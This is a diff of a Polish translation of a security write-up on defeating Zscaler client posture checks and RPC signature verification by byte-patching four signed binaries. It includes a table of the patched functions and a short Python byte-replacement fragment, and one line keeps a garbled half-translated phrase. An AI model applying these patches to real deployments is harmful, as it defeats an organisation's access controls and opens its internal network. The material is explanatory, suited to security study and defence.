+2. Wewnętrzne punkty końcowe RPC tylko weryfikują, że łączący się plik wykonywalny jest **podpisany przez Zscaler** (za pomocą `WinVerifyTrust`).
 
-Poprzez **modyfikację czterech podpisanych binariów na dysku** oba mechanizmy mogą być zneutralizowane:
+Poprzez **łatanie czterech podpisanych binariów na dysku** oba mechanizmy mogą być zneutralizowane:
 
-| Binarne | Oryginalna logika zmodyfikowana | Wynik |
+| Binarne | Oryginalna logika załatana | Wynik |
 |--------|------------------------|---------|
 | `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Zawsze zwraca `1`, więc każda kontrola jest zgodna |
 | `ZSAService.exe` | Pośrednie wywołanie `WinVerifyTrust` | NOP-ed ⇒ każdy (nawet niepodpisany) proces może łączyć się z rurami RPC |
 | `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Zastąpione przez `mov eax,1 ; ret` |
 | `ZSATunnel.exe` | Kontrole integralności tunelu | Skrócone | 
 
-Minimalny fragment patchera:
+Minimalny fragment łatający:
 ```python
 pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
 replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
@@ -695,7 +695,7 @@ f.write(replacement)
 Po zastąpieniu oryginalnych plików i ponownym uruchomieniu stosu usług:
 
 * **Wszystkie** kontrole postawy wyświetlają **zielony/zgodny**.
-* Niesigned lub zmodyfikowane binaria mogą otwierać punkty końcowe RPC w nazwanym potoku (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* Niesygnowane lub zmodyfikowane pliki binarne mogą otwierać punkty końcowe RPC w nazwanym potoku (np. `\\RPC Control\\ZSATrayManager_talk_to_me`).
 * Sk compromised host uzyskuje nieograniczony dostęp do wewnętrznej sieci zdefiniowanej przez polityki Zscaler.
 
 Ten przypadek pokazuje, jak czysto klienckie decyzje o zaufaniu i proste kontrole podpisów mogą być pokonane za pomocą kilku poprawek bajtowych.
